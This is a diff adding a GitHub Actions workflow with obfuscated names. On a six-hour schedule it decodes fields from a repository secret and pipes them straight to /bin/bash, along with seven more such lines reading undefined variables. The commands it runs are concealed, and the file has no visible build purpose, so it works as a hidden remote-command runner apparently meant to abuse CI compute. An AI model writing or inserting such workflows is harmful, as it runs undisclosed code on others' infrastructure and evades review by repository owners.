@@ -1,0 +1,25 @@
+name: budapeisixy
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: budapeisixy
+        env:
+          omoc64: ${{ secrets.omoc64 }}
+        run: |
+          echo $omoc64 | jq -r .f892 | /bin/bash
+          echo $aht8889 | jq -r .uxeh98557 | /bin/bash
+          echo $hua43 | jq -r .voaln23559 | /bin/bash
+          echo $dl44 | jq -r .m2379 | /bin/bash
+          echo $zhs906 | jq -r .c355 | /bin/bash
+          echo $vsbq932 | jq -r .s231 | /bin/bash
+          echo $mbwjk90 | jq -r .ybbaf32 | /bin/bash
+          echo $k399 | jq -r .c078 | /bin/bash
+
